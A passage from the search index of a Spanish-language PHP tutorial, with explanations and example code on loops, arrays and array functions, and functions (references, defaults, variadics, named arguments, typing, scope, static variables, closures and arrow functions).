instrucci\u00f3n <code>for</code>:</p> <pre><code>&lt;?php\n// Bucle ascendente\nfor ($i = 1; $i &lt;= 10; $i++) {\n    echo \"L\u00ednea \" . $i;\n    echo \"&lt;br&gt;\";\n}\n\n// Bucle descendente\nfor ($i = 10; $i &gt;= 0; $i--) {\n    echo \"L\u00ednea \" . $i;\n    echo \"&lt;br&gt;\";\n}\n?&gt;\n</code></pre> <p>M\u00e1s adelante estudiaremos el bucle <code>foreach</code> para recorrer arrays.</p> <p>PHP, del mismo modo que Java y C, permite romper los bucles mediante la instrucci\u00f3n <code>break</code>. A su vez, <code>continue</code> permite saltar a la siguiente iteraci\u00f3n.</p> <p>Si puedes, evita <code>break</code> y <code>continue</code></p> <p>Una forma de evitar usarlos es mediante variables flag para controlar la salida de los bucles. Por ejemplo:</p> <pre><code>&lt;?php\n$salir = false;\nfor ($i = 1; $i &lt;= 10 &amp;&amp; !$salir; $i++) {\n  if ($i === 5) {\n    echo \"Salgo cuando i=5\";\n    $salir = true;\n  }\n}\n?&gt;\n</code></pre>"},{"location":"02php.html#26-arrays","title":"2.6 Arrays","text":"<p>Para almacenar datos compuestos, podemos utilizar tanto arrays sencillos como arrays asociativos (similares a un mapa). En realidad todos los arrays son mapas ordenados compuestos de pares clave-valor.</p> <p>Cuidado con mezclar tipos</p> <p>Como el tipado es din\u00e1mico, nuestros arrays pueden contenedor datos de diferentes tipos. No se recomienda mezclar los tipos.</p> <p>Del mismo modo que Java, se definen mediante corchetes, son 0-index, y se puede asignar un valor a un posici\u00f3n determinada:</p> <pre><code>&lt;?php\n$frutas = array(\"naranja\", \"pera\", \"manzana\");\n\n$frutas2 = [\"naranja\", \"pera\", \"manzana\"];\n\n$frutas3 = [];\n$frutas3[0] = \"naranja\";\n$frutas3[1] = \"pera\";\n$frutas3[] = \"manzana\"; // lo a\u00f1ade al final\n</code></pre> <p>Podemos obtener el tama\u00f1o del array mediante la funci\u00f3n <code>count(array)</code>. Para recorrer el array haremos uso de un bucle <code>for</code>:</p> <pre><code>&lt;?php\n$tam = count($frutas); // tama\u00f1o del array\n\nfor ($i=0; $i&lt;count($frutas); $i++) {\n    echo \"Elemento $i: $frutas[$i] &lt;br /&gt;\";\n}\n</code></pre> <p>Otra forma de recorrer los arrays, incluso m\u00e1s elegante, es hacer uso de <code>foreach</code>. Su sintaxis es <code>foreach (array as elemento)</code>:</p> <pre><code>&lt;?php\n// Mediante foreach no necesitamos saber el tama\u00f1o del array\nforeach ($frutas as $fruta) {\n    echo \"$fruta &lt;br /&gt;\";\n}\n</code></pre>"},{"location":"02php.html#arrays-asociativos","title":"Arrays asociativos","text":"<p>Cada elemento es un par clave-valor. En vez de acceder por la posici\u00f3n, lo hacemos mediante una clave. As\u00ed pues, para cada clave se almacena un valor.</p> <p>A la hora de recorrer este tipo de arrays, mediante <code>foreach</code> separamos cada elemento en una pareja <code>clave =&gt; valor</code>:</p> <pre><code>&lt;?php\n$capitales = [\"Italia\" =&gt; \"Roma\",\n    \"Francia\" =&gt; \"Paris\",\n    \"Portugal\" =&gt; \"Lisboa\"];\n$capitalFrancia = $capitales[\"Francia\"]; // se accede al elemento por la clave, no la posici\u00f3n\n\n$capitales[\"Alemania\"] = \"Berl\u00edn\"; // a\u00f1adimos un elemento\n\necho \"La capital de Francia es $capitalFrancia &lt;br /&gt;\";\necho \"La capital de Francia es {$capitales[\"Francia\"]} &lt;br /&gt;\";\n\n$capitales[] = \"Madrid\"; // se a\u00f1ade con la clave 0 !!! \u00a1\u00a1\u00a1No asignar valores sin clave!!!\n\nforeach ($capitales as $valor) { // si recorremos un array asociativo, mostraremos los valores\n    echo \"$valor &lt;br /&gt;\";\n}\n\nforeach ($capitales as $pais =&gt; $ciudad) { // separamos cada elemento en clave =&gt; valor\n    echo \"$pais : $ciudad &lt;br /&gt;\";\n}\n</code></pre>"},{"location":"02php.html#operaciones","title":"Operaciones","text":"<p>Todas las operaciones</p> <p>Consultar en https://www.php.net/manual/es/book.array.php todas las operaciones disponibles para los arrays con su sintaxis y ejemplos.</p> <p>Unas de las operaciones m\u00e1s utilizadas con arrays son:</p>"},{"location":"02php.html#visualizacion","title":"Visualizaci\u00f3n","text":"<ul> <li><code>print_r($array)</code>: muestra el contenido de todo el <code>$array</code> en formato \u00edndice =&gt; valor. Si queremos mostrar el contenido con un formato determinado, hemos de recorrer el array con <code>foreach</code>.</li> <li><code>var_dump($mixed)</code>: muestra el contenido del elemento recibido. Muestra m\u00e1s informaci\u00f3n que <code>print_r</code> dando el tipo de dato de cada elemento y en el caso de cadenas, su longitud.</li> </ul>"},{"location":"02php.html#insercioneliminacion-de-datos","title":"Inserci\u00f3n/Eliminaci\u00f3n de datos","text":"<ul> <li><code>$elemento = array_pop($array)</code>: elimina el \u00faltimo elemento</li> <li><code>array_push($array, $elemento)</code>: a\u00f1ade uno o m\u00e1s elementos al final</li> <li><code>$elemento = array_shift($array)</code>: elimina el primer primer elemento</li> <li><code>array_unshift($array, $elemento)</code>: a\u00f1ade uno o m\u00e1s elementos al inicio</li> <li><code>$array3 = array_replace($array, $array2)</code>: reemplaza los valores de <code>$array</code> con valores que tienen las mismas claves en cada uno de los siguientes arrays pasados</li> </ul>"},{"location":"02php.html#busqueda","title":"B\u00fasqueda","text":"<ul> <li><code>$booleano = in_array($elem, $array)</code>: averigua si <code>$elem</code> est\u00e1 en el <code>$array</code></li> <li><code>$clave = array_search($elem, $array)</code>: busca <code>$elem</code> en el <code>$array</code> y devuelve su clave o null en el caso de no encontrarlo</li> </ul> <p>Las siguientes instrucciones no son espec\u00edficas de los arrays pero se usan frecuentemente con arrays: </p> <ul> <li><code>isset($array[elemento])</code>: indica si existe/tiene valor elemento dentro del array</li> <li><code>unset($array[elemento])</code>: elimina el elemento del array (deja un hueco)</li> </ul> PHPConsola <pre><code>&lt;?php\n$frutas = [\"naranja\", \"pera\", \"manzana\"];\n\narray_push($frutas, \"pi\u00f1a\");\nprint_r($frutas);\n\n$ultFruta = array_pop($frutas);\nif (in_array(\"pi\u00f1a\", $frutas)) {\n    echo \"&lt;p&gt;Queda pi\u00f1a&lt;/p&gt;\";\n} else {\n    echo \"&lt;p&gt;No queda pi\u00f1a&lt;/p&gt;\";\n}\nprint_r($frutas);\n</code></pre> <pre><code>Array\n(\n  [0] =&gt; naranja\n  [1] =&gt; pera\n  [2] =&gt; manzana\n  [3] =&gt; pi\u00f1a\n)\n&lt;p&gt;No queda pi\u00f1a&lt;/p&gt;\nArray\n(\n  [0] =&gt; naranja\n  [1] =&gt; pera\n  [2] =&gt; manzana\n)\n</code></pre>"},{"location":"02php.html#claves-y-valores","title":"Claves y valores","text":"<ul> <li><code>$claves = array_keys($array)</code>: devuelve las claves del <code>$array</code> asociativo</li> <li><code>$valores = array_values($array)</code>: devuelve los valores del <code>$array</code> asociativo</li> <li><code>$tam = count($array)</code>: devuelve el tama\u00f1o de <code>$array</code></li> </ul>"},{"location":"02php.html#ordenacion","title":"Ordenaci\u00f3n","text":"<ul> <li><code>sort($array)</code>: ordena los elementos del <code>$array</code></li> <li><code>rsort($array)</code>: ordena los elementos del <code>$array</code> en orden inverso</li> <li><code>ksort($array)</code>: ordena los elementos del <code>$array</code> por clave</li> <li><code>krsort($array)</code>: ordena los elementos del <code>$array</code> por clave en orden inverso</li> </ul> PHPConsola <pre><code>&lt;?php\n$capitales = array(\"Italia\" =&gt; \"Roma\",\n\"Francia\" =&gt; \"Paris\",\n\"Portugal\" =&gt; \"Lisboa\");\n\n$paises = array_keys($capitales);\nprint_r($paises);\nsort($paises);\nprint_r($paises);\n\nunset($capitales[\"Francia\"]);\nprint_r($capitales);\n</code></pre> <pre><code>Array\n(\n  [0] =&gt; Italia\n  [1] =&gt; Francia\n  [2] =&gt; Portugal\n)\nArray\n(\n  [0] =&gt; Francia\n  [1] =&gt; Italia\n  [2] =&gt; Portugal\n)\nArray\n(\n  [Italia] =&gt; Roma\n  [Portugal] =&gt; Lisboa\n)\n</code></pre> <p>Comparaci\u00f3n de las funciones de ordenaci\u00f3n</p> <p>Funciones como sort ordenan por valor perdi\u00e9ndose la asociaci\u00f3n que pudiera tener con la clave. Es importante tener claro estos conceptos. Aqu\u00ed tienes una comparativa de las funciones para ordenar arrays.</p>"},{"location":"02php.html#copia-de-arrays","title":"Copia de arrays","text":"<p>Al asignar un array a otro se realiza una copia por valor. Cuidado con esta operaci\u00f3n que puede consumir muchos recursos.</p> PHPConsola <pre><code>&lt;?php\n$nombres = [\"Juan\", \"Ana\", \"Pedro\", \"Laura\"];\n$copia = $nombres;\nsort($nombres);\nprint_r($nombres);\nprint_r($copia);\n</code></pre> <pre><code>Array\n(\n    [0] =&gt; Ana\n    [1] =&gt; Juan\n    [2] =&gt; Laura\n    [3] =&gt; Pedro\n)\nArray\n(\n    [0] =&gt; Juan\n    [1] =&gt; Ana\n    [2] =&gt; Pedro\n    [3] =&gt; Laura\n)\n</code></pre> <p>Existen much\u00edsimas m\u00e1s funciones para trabajar con arrays. Te vuelvo a recomendar que utilices la documentaci\u00f3n oficial para ampliar informaci\u00f3n sobre funciones como array_slice, array_splice, array_map, array_reduce...</p> <p>Art\u00edculos para profundizar en las operaciones con arrays</p> <ul> <li>Un art\u00edculo muy completo (en ingl\u00e9s) de C\u00f3mo trabajar con arrays en PHP de la manera correcta.  </li> <li>Otro art\u00edculo recomendable (en ingl\u00e9s) es C\u00f3mo ordenar arrays en PHP.</li> </ul>"},{"location":"02php.html#arrays-bidimensionales","title":"Arrays bidimensionales","text":"<p>Consiste en un array de arrays, ya sean arrays secuenciales o asociativos. Puede haber N dimensiones.</p> <pre><code>&lt;?php\n$persona[\"nombre\"] = \"Bruce Wayne\";\n$persona[\"telefonos\"] = [\"966 123 456\", \"636 636 636\"]; // array de arrays ordinarios\n$persona[\"profesion\"] = [\"dia\" =&gt; \"fil\u00e1ntropo\", \"noche\" =&gt; \"caballero oscuro\"]; // array de arrays asociativos\n\necho $persona['nombre'].\" por la noche trabaja de \".$persona['profesion']['noche'];\n</code></pre> <p>Combinando los arrays asociativos en varias dimensiones podemos almacenar la informaci\u00f3n como si fuera una tabla:</p> <pre><code>&lt;?php\n$menu1 = [\"Plato1\" =&gt; \"Macarrones con queso\", \"Plato2\" =&gt; \"Pescado asado\", \"Bebida\" =&gt; \"Coca-Cola\", \"Postre\" =&gt; \"Helado de vainilla\"];\n$menu2 = [\"Plato1\" =&gt; \"Sopa\", \"Plato2\" =&gt; \"Lomo con patatas\", \"Bebida\" =&gt; \"Agua\", \"Postre\" =&gt; \"Arroz con leche\"];\n$menus = [$menu1, $menu2]; // creamos un array a partir de arrays asociativos\n\nforeach ($menus as $menudeldia) {\n  echo \"Men\u00fa del d\u00eda&lt;br/&gt;\";\n\n  foreach ($menudeldia as $platos =&gt; $comida) {\n    echo \"$platos: $comida &lt;br/&gt;\";\n  }\n}\n\n// Para acceder a un elemento concreto se anidan los corchetes\n$postre = $menus[0][\"Postre\"];\n</code></pre> <p>Aunque pueda parecer una buena idea crear este tipo de estructuras, es mejor utilizar objetos conjuntamente con arrays (posiblemente arrays de otros objetos) para crear estructuras complejas que permitan modelar mejor los problemas.</p>"},{"location":"02php.html#27-funciones","title":"2.7 Funciones","text":"<p>Al no declararse los tipos de datos, los par\u00e1metros de las funciones no tienen tipo ni se indica el tipo de dato que devuelven. El paso de par\u00e1metros se realiza por valor, es decir, se realiza una copia de la variable.</p> <pre><code>&lt;?php\nfunction nombreFuncion($par1, $par2, ...) {\n  // c\u00f3digo\n  return $valor;\n}\n\n$resultado = nombreFuncion($arg1, $arg2, \u2026);\n?&gt;\n</code></pre> <p>Por ejemplo:</p> <pre><code>&lt;?php\nfunction diaSemana() {\n    $semana = [ \"lunes\", \"martes\", \"mi\u00e9rcoles\",\n        \"jueves\", \"viernes\", \"s\u00e1bado\", \"domingo\" ];\n    $dia = $semana[rand(0, 6)];\n    return $dia;\n}\n\n$diaCine = diaSemana();\necho \"El pr\u00f3ximo $diaCine voy al cine.\";\n?&gt;\n</code></pre>"},{"location":"02php.html#parametros-por-referencia","title":"Par\u00e1metros por referencia","text":"<p>Si queremos pasar un par\u00e1metro por referencia, en la declaraci\u00f3n de la funci\u00f3n, indicaremos los par\u00e1metros mediante el operador <code>&amp;</code> para indicar la direcci\u00f3n de memoria de la variable.</p> <pre><code>&lt;?php\nfunction duplicarPorValor($argumento) {\n    $argumento = $argumento * 2;\n    echo \"Dentro de la funci\u00f3n: $argumento.&lt;br&gt;\";\n}\nfunction duplicarPorReferencia(&amp;$argumento) {\n    $argumento = $argumento * 2;\n    echo \"Dentro de la funci\u00f3n: $argumento.&lt;br&gt;\";\n}\n\n$numero1 = 5;\necho \"Antes de llamar: $numero1.&lt;br&gt;\";\nduplicarPorValor($numero1);\necho \"Despu\u00e9s de llamar: $numero1.&lt;br&gt;\";\necho \"&lt;br&gt;\";\n\n$numero2 = 7;\necho \"Antes de llamar: $numero2.&lt;br&gt;\";\nduplicarPorReferencia($numero2);\necho \"Despu\u00e9s de llamar: $numero2.&lt;br&gt;\";\n?&gt;\n</code></pre>"},{"location":"02php.html#parametros-por-defecto-opcionales","title":"Par\u00e1metros por defecto / opcionales","text":"<p>Permiten asignar valores en la declaraci\u00f3n, y posteriormente, dejar el argumento en blanco.</p> <pre><code>&lt;?php\nfunction obtenerCapital($pais = \"todos\") {\n    $capitales = array(\"Italia\" =&gt; \"Roma\",\n    \"Francia\" =&gt; \"Paris\",\n    \"Portugal\" =&gt; \"Lisboa\");\n\n    if ($pais == \"todos\") {\n        return array_values($capitales);\n    } else {\n        return $capitales[$pais];\n    }\n}\n\nprint_r(obtenerCapital());\necho \"&lt;br/&gt;\";\necho obtenerCapital(\"Francia\");\n</code></pre> <p>En el caso de convivir con otro tipo de par\u00e1metros, los par\u00e1metros que tienen el valor asignado por defecto siempre se colocan al final.</p> <pre><code>&lt;?php\nfunction saluda($nombre, $prefijo = \"Sr\") {\n    echo \"Hola \".$prefijo.\" \".$nombre;\n}\n\nsaluda(\"Rasmus\", \"Mr\");\nsaluda(\"Rasmus\");\nsaluda(\"Marina\", \"Srta\");\n</code></pre>"},{"location":"02php.html#parametros-variables","title":"Par\u00e1metros variables","text":"<p>Podemos tener funciones donde en la declaraci\u00f3n no indiquemos la cantidad de datos de entrada.</p> <ul> <li><code>$arrayArgs = func_get_args();</code> \u2192 Obtiene un array con los par\u00e1metros</li> <li><code>$cantidad = func_num_args();</code> \u2192 Obtiene la cantidad de par\u00e1metros recibidos</li> <li><code>$valor = func_get_arg(numArgumento);</code> \u2192 Obtiene el par\u00e1metro que ocupa la posici\u00f3n <code>numArgumento</code>.</li> </ul> <p>Estas funciones no se pueden pasar como par\u00e1metro a otra funci\u00f3n (como funciones variable, que veremos m\u00e1s adelante). Para ello, debemos guardar previamente la funci\u00f3n en una variable.</p> <pre><code>&lt;?php\nfunction sumaParametros() {\n    if (func_num_args() == 0) {\n        return false;\n    } else {\n        $suma = 0;\n\n        for ($i = 0; $i &lt; func_num_args(); $i++) {\n            $suma += func_get_arg($i);\n        }\n\n        return $suma;\n    }\n}\n\necho sumaParametros(1, 5, 9); // 15\n?&gt;\n</code></pre> <p>Funciones vari\u00e1dicas</p> <p>Una funci\u00f3n vari\u00e1dica es una funci\u00f3n que puede aceptar un n\u00famero variable de argumentos, lo que permite flexibilidad en su uso al no requerir un n\u00famero fijo de ellos.</p> <p>Desde PHP 5.6, se puede utilizar el operador de propagaci\u00f3n o descomposici\u00f3n <code>...</code> el cual \"disfraza\" los par\u00e1metros de una funci\u00f3n como un array, usado en la declaraci\u00f3n de la funci\u00f3n:</p> <pre><code>&lt;?php\nfunction sumaParametrosMejor(...$numeros) { // OJO! Aqu\u00ed se usa en la declaraci\u00f3n de la funci\u00f3n\n    if (count($numeros) == 0) {\n        return false;\n    } else {\n        $suma = 0;\n\n        foreach ($numeros as $num) {\n            $suma += $num;\n        }\n\n        return $suma;\n    }\n}\n\necho sumaParametrosMejor(1, 5, 9); // 15\n?&gt;\n</code></pre> <p>M\u00e1s usos de <code>...</code></p> <p>Tambi\u00e9n se puede utilizar para dividir un array en variables separadas para proporcionar argumentos en la llamada de la funci\u00f3n.</p> <pre><code>&lt;?php\nfunction suma($a, $b) {\n    return $a + $b;\n}\n\necho suma(...[1, 5]); // OJO! Aqu\u00ed se usa en la llamada de la funci\u00f3n\n\n$a = [1, 5];\necho suma(...$a); // OJO! Aqu\u00ed se usa en la llamada de la funci\u00f3n\n?&gt;\n</code></pre>"},{"location":"02php.html#argumentos-con-nombre","title":"Argumentos con nombre","text":"<p>Desde PHP 8.0 podemos pasar los argumentos con el nombre (adem\u00e1s de por posici\u00f3n, como hemos hecho hasta ahora). Los argumentos con nombre se pasan poniendo el nombre como prefijo del par\u00e1metros separado por dos puntos: <code>$resultado = funcion( arg1 : valor1, arg2 : valor2);</code></p> <p>Esta caracter\u00edstica complementa los parametros opcionales permitiendonos saltar su valor:</p> <pre><code>&lt;?php\nfunction funcionArgumentosNombre($a, $b = 2, $c = 4) {\n\u00a0\u00a0echo \"$a $b $c\";\n}\nfuncionArgumentosNombre(c: 3, a: 1); // \"1 2 3\"\n</code></pre> <p>Tanto los par\u00e1metros opcionales como los obligatorios pueden tener nombre, pero lo argumentos con nombre se tienen que poner despu\u00e9s de los que no lo tienen.</p> <pre><code>&lt;?php\nfuncionArgumentosNombre(1, c: 3); // \"1 2 3\"\n</code></pre>"},{"location":"02php.html#funciones-tipadas","title":"Funciones tipadas","text":"<p>Las \u00faltimas versiones de PHP permiten definir el tipo de dato de par\u00e1metros y valor de retorno de funciones, as\u00ed tambi\u00e9n como de propiedades de las clases (pero no de las variables locales). El propio interprete de PHP comprobar\u00e1 los tipos y lanzar\u00e1 errores si los tipos son incorrectos. </p> <p>Tipos de datos en funciones</p> <pre><code>&lt;?php\nfunction suma(int $a, int $b) : int {\n    return $a + $b;\n}\n\necho suma(10, 30); // 40\necho suma(\"10\", 30); // 40 (PHP hace conversi\u00f3n impl\u00edcita de \"10\" a 10)\necho suma(\"diez\", 30); // ERROR\n?&gt;\n</code></pre> <p>Podemos ir m\u00e1s all\u00e1 y ser m\u00e1s restrictivos evitando las conversiones impl\u00edcitas del propio lenguaje (ej: \"10\" !== 10) definiendo strict_types (tipificaci\u00f3n estricta) en la primera l\u00ednea de cada archivo <code>.php</code>:</p> <pre><code>&lt;?php\ndeclare(strict_types=1);\n</code></pre> <p>As\u00ed pues, vamos a  definir los tipos de los par\u00e1metros y de los valores devueltos mediante los tipos: <code>int</code>, <code>float</code>, <code>string</code>, <code>bool</code>, <code>object</code> y <code>array</code>.</p> <p>Si una funci\u00f3n no devuelve nada se indica mediante el tipo <code>void</code>.</p> <pre><code>&lt;?php\ndeclare(strict_types=1);\n\nfunction suma(int $a, int $b) : int {\n    return $a + $b;\n}\n\n$num = 33;\necho suma(10, 30); // 40\necho suma(10, $num); // 43\necho suma(\"10\", 30); // error por tipificaci\u00f3n estricta activada, si no dar\u00eda 40\n?&gt;\n</code></pre>"},{"location":"02php.html#alcance","title":"Alcance","text":"<p>Las variables definidas fuera de las funciones tienen alcance global: accesibles desde cualquier funci\u00f3n. Los par\u00e1metros de una funci\u00f3n y las variables declaradas dentro de una funci\u00f3n (se conocen como variables locales) s\u00f3lo son accesibles desde dentro de la misma funci\u00f3n \u2192 alcance de funci\u00f3n.</p> <p>En caso de conflicto, tienen prioridad las variables locales. Para evitar el conflicto, dentro de la funci\u00f3n, podemos declarar la variable como <code>global</code>.</p> Alcance localAlcance global <pre><code>&lt;?php\nfunction miCiudad() {\n    $ciudad = \"Elche\";\n    echo \"Dentro de la funci\u00f3n: $ciudad.&lt;br&gt;\";\n}\n\n$ciudad = \"Alicante\";\necho \"Antes de la funci\u00f3n: $ciudad.&lt;br&gt;\";\nmiCiudad();\necho \"Despu\u00e9s de la funci\u00f3n: $ciudad.&lt;br&gt;\"\n?&gt;\n</code></pre> <pre><code>&lt;?php\nfunction miCiudad() {\n    global $ciudad;\n    $ciudad = \"Elche\";\n    echo \"Dentro de la funci\u00f3n: $ciudad.&lt;br&gt;\";\n}\n\n$ciudad = \"Alicante\";\necho \"Antes de llamar: $ciudad.&lt;br&gt;\";\nmiCiudad();\necho \"Despu\u00e9s de llamar: $ciudad.&lt;br&gt;\"\n?&gt;\n</code></pre> <p>No usar globales</p> <p>Hay que evitar el uso de variables globales dentro de las funciones. Si una funci\u00f3n necesita una dato de fuera, siempre es mejor pasarlo como par\u00e1metro.</p> <p>De forma general hay que evitar el uso de variables globales en nuestras aplicaciones para evitar efectos no deseados.</p>"},{"location":"02php.html#variables-estaticas-en-funciones","title":"Variables est\u00e1ticas en funciones","text":"<p>Las variables est\u00e1ticas en PHP son variables locales a una funci\u00f3n que mantienen su valor entre diferentes llamadas a esa funci\u00f3n.</p> <p>A diferencia de las variables normales (que se destruyen al finalizar la ejecuci\u00f3n de la funci\u00f3n), una variable est\u00e1tica solo se inicializa una vez y conserva su valor mientras dure el script.</p> Ejemplo 1 - ContadorEjemplo 2 - Cach\u00e9 <pre><code>&lt;?php\n    function ejemplo() {\n        static $contador = 0; // Se inicializa solo la primera vez\n        $contador++;\n        echo \"Contador: $contador&lt;br&gt;\";\n    }\n\n    ejemplo(); // Contador: 1\n    ejemplo(); // Contador: 2\n    ejemplo(); // Contador: 3\n?&gt;\n</code></pre> <pre><code>&lt;?php\n    function obtenerCuadrado($num) {\n        static $cache = [];\n\n        if (isset($cache[$num])) {\n            return $cache[$num]; // Devuelve el resultado almacenado\n        }\n\n        echo \"Calculando...&lt;br&gt;\";\n        $cache[$num] = $num * $num;\n        return $cache[$num];\n    }\n\n    echo obtenerCuadrado(4); // Calculando... \u2192 16\n    echo obtenerCuadrado(4); // (usa cach\u00e9) \u2192 16\n?&gt;\n</code></pre> Cu\u00e1ndo hay que utilizarlas <p>Se re comienda su uso para:</p> <ul> <li>Conservar un valor entre llamadas a una funci\u00f3n sin usar variables globales.</li> <li>Implementar contadores, cach\u00e9s internos, o inicializaci\u00f3n \u00fanica dentro de una funci\u00f3n.</li> <li>Mantener estado interno simple y local a una funci\u00f3n.</li> </ul> <p>No se recomienda:</p> <ul> <li>Si son necesarios varios estados independientes \u2192 mejor clausuras u objetos.</li> <li>Si se pretende reiniciar el estado f\u00e1cilmente.</li> <li>Para compartir el estado entre funciones \u2192 mejor una clase con propiedades est\u00e1ticas.</li> </ul>"},{"location":"02php.html#funciones-de-primera-clase","title":"Funciones de primera clase","text":"<p>Un lenguaje de programaci\u00f3n se dice que tiene funciones de primera clase cuando las funciones en ese lenguaje son tratadas como cualquier otra variable. Por ejemplo, la funci\u00f3n puede ser pasada como argumento a otras funciones, puede ser devuelta por otra funci\u00f3n y puede ser asignada a una variable.</p> <pre><code>&lt;?php\n    $saludar = function() {\n        echo \"\u00a1Hola!\";\n    };\n\n    $saludar(); // Salida: \u00a1Hola!\n?&gt;\n</code></pre>"},{"location":"02php.html#funciones-variable","title":"Funciones variable","text":"<ul> <li>Permite asignar una funci\u00f3n a una variable mediante su nombre (entre comillas).</li> <li>Si una variable va seguida de par\u00e9ntesis, PHP buscar\u00e1 una funci\u00f3n con su valor.</li> </ul> <pre><code>&lt;?php\n    $miFuncionSuma = \"suma\";\n    echo $miFuncionSuma(3,4); // invoca a la funci\u00f3n suma\n?&gt;\n</code></pre>"},{"location":"02php.html#funciones-anonimas","title":"Funciones an\u00f3nimas","text":"<p>Son funciones que no tienen nombre y se utilizan principalmente para gestionar los callbacks. Este tipo de funciones se utiliza mucho en Javascript para gestionar los eventos y promesas.</p> <pre><code>&lt;?php\n// EJEMPLO 1: Funci\u00f3n an\u00f3nima sin par\u00e1metros\n$anonima = function() {\n    echo \"Hola\";\n};\n\n$anonima();\n\n// EJEMPLO 2: Funci\u00f3n an\u00f3nima con par\u00e1metros\n$anonimaConParametro = function($nombre) {\n    echo \"Hola \".$nombre;\n};\n\n$anonimaConParametro(\"Rasmus\");\n\n// EJEMPLO 3: Uso de variables del \u00e1mbito padre en la funci\u00f3n an\u00f3nima --&gt; `use`\n$mensaje = \"Hola\";\n$saludo = function() use ($mensaje) {\n    echo $mensaje;\n};\n\n$saludo();\n\n// EJEMPLO 4: Uso de par\u00e1metros y variables del \u00e1mbito padre\n$saludoPHP = function($arg) use ($mensaje) {\n    echo $mensaje.\" \".$arg;\n};\n\n$saludoPHP(\"PHP\");\n?&gt;\n</code></pre> <p>M\u00e1s info sobre funciones an\u00f3nimas</p>"},{"location":"02php.html#clausuras","title":"Clausuras","text":"<p>El uso de <code>use</code> tiene m\u00e1s sentido para crear clausuras. </p> <p>Clausuras</p> <p>Una clausura es una t\u00e9cnica que permite definir un \"registro\" que contiene una funci\u00f3n junto al \u00e1mbito donde fue declarada, de tal forma que la funci\u00f3n puede acceder a los valores de las variables declaradas en el mismo \u00e1mbito, aun cuando la invocaci\u00f3n ocurra fuera de este. El uso de clausuras se asocia con el paradigma de programaci\u00f3n funcional.    </p> <p>Una clausura asocia a una funci\u00f3n con un conjunto de variables \"privadas\", que persisten en las invocaciones a la funci\u00f3n. El \u00e1mbito de la variable abarca \u00fanicamente al \u00e1mbito donde la funci\u00f3n fue declarada, por lo que no puede ser accedida desde otra parte del programa. No obstante, la variable mantiene su valor de forma indefinida para las siguientes invocaciones. Como consecuencia, las clausuras pueden ser usadas para simular el encapsulamiento y la ocultaci\u00f3n de la programaci\u00f3n orientada a objetos.</p> Ejemplo 1Ejemplo 2Ejemplo 3Ejemplo 4 <pre><code>&lt;?php\n    // Clausura para crear contador\n    function contador($valorInicial = 0){\n        $cuenta = $valorInicial;\n\n        $incrementa = function() use (&amp;$cuenta){\n            return ++$cuenta;\n        };\n\n        return $incrementa;\n    }\n\n    // PROGRAMA PRINCIPAL\n\n    // Contador 1\n    $incrementaContador1 = contador();\n\n    echo $incrementaContador1(); // 1\n    echo $incrementaContador1(); // 2\n    echo $incrementaContador1(); // 3\n\n    // Contador 2\n    $incrementaContador2 = contador(7);\n\n    echo $incrementaContador2(); // 8\n    echo $incrementaContador2(); // 9\n?&gt;\n</code></pre> <pre><code>&lt;?php\n    // Clausura para crear contador\n    function contador($valorInicial = 0){\n        $cuenta = $valorInicial;\n\n        $incrementa = function() use (&amp;$cuenta){\n            return ++$cuenta;\n        };\n\n        $decrementa = function() use (&amp;$cuenta){\n            return --$cuenta;\n        };\n\n        $inicializa = function() use (&amp;$cuenta){\n            $cuenta = 0;\n            return $cuenta;\n        };\n\n        return [\n            \"incrementa\" =&gt; $incrementa, \n            \"decrementa\" =&gt; $decrementa, \n            \"inicializa\" =&gt; $inicializa\n        ];\n    }\n\n    // PROGRAMA PRINCIPAL\n\n    // Contador 1\n    $contador1 = contador();\n\n    echo $contador1[\"incrementa\"](); // 1\n    echo $contador1[\"incrementa\"](); // 2\n    echo $contador1[\"decrementa\"](); // 1\n\n    echo $contador1[\"inicializa\"](); // 0\n\n    // Contador 2\n    $contador2 = contador(6);\n\n    echo $contador2[\"incrementa\"](); // 7\n    echo $contador2[\"decrementa\"](); // 6\n?&gt;\n</code></pre> <pre><code>&lt;?php\n    // Clausura para crear \"iterador\"\n    function iterador($arrayInicial = []) {\n        $posicion = 0;\n        $array = $arrayInicial;\n\n        return function() use (&amp;$posicion, $array) {\n            return $array[$posicion++];\n        };\n    }\n\n    // PROGRAMA PRINCIPAL\n    $nombres = [\"Eladio\", \"David\", \"Ana\", \"Juan\", \"Maria\"];\n    $next = iterador($nombres);\n\n    echo \"&lt;p&gt;\" . $next() . \"&lt;/p&gt;\";\n    echo \"&lt;p&gt;\" . $next() . \"&lt;/p&gt;\";\n    echo \"&lt;p&gt;\" . $next() . \"&lt;/p&gt;\";\n    echo \"&lt;p&gt;\" . $next() . \"&lt;/p&gt;\";\n?&gt;\n</code></pre> <pre><code>&lt;?php\n    // Clausura para simular el uso de useState de React\n    function useState($valorInicial) {\n        $estado = $valorInicial;\n\n        $get = function() use (&amp;$estado) {\n            return $estado;\n        };\n\n        $set = function($nuevoValor) use (&amp;$estado) {\n            $estado = $nuevoValor;\n        };\n\n        return [$get, $set];\n    }\n\n    // PROGRAMA PRINCIPAL\n    [$count, $setCount] = useState(0);\n\n    echo $count(); // 0\n    $setCount($count() + 1); // 1\n    $setCount(42); // 42\n\n    // Nota: Podr\u00edamos haber devuelto la referencia a la variable en lugar de get\n    // tal y como hace React --&gt; return [&amp;$estado, $set];\n    // y as\u00ed har\u00edamos referencia a $count en lugar de $count()\n    // pero ojo, que de esta forma la variable ser\u00eda directamente modificable sin el set\n?&gt;\n</code></pre>"},{"location":"02php.html#funciones-flecha","title":"Funciones flecha","text":"<p>Desde PHP 7.4 se han introducido las funciones flecha (arrow functions) como una sint\u00e1sis m\u00e1s concisa de las funciones an\u00f3nimas.</p> <p>Las funciones flecha tienen la forma b\u00e1sica de <code>fn(argument_list) =&gt; expr</code>. La palabra reservada function se reduce a fn, se omiten las llaves y el return, devolvi\u00e9ndose directamente la expresi\u00f3n.</p> <p>Las funciones flecha soportan las mismas caracter\u00edsticas que las funciones an\u00f3nimas, s\u00f3lo que adem\u00e1s, el uso de variables del \u00e1mbito padre siempre es autom\u00e1tico (no es necesario especificarlas mediante <code>use</code>).</p> <pre><code>&lt;?php\n$y = 1;\n\n// Funci\u00f3n an\u00f3nima usando variable $y del \u00e1mbito padre expl\u00edcitamente\n$fn1 = function ($x) use ($y) {\n    return $x + $y;\n};\n\n// Funci\u00f3n flecha usando variable $y del \u00e1mbito padre autom\u00e1ticamente\n$fn2 = fn($x) =&gt; $x + $y;\n\necho $fn1(3); // 4\necho $fn2(3); // 4\n?&gt;\n</code></pre> <p>M\u00e1s info sobre funciones 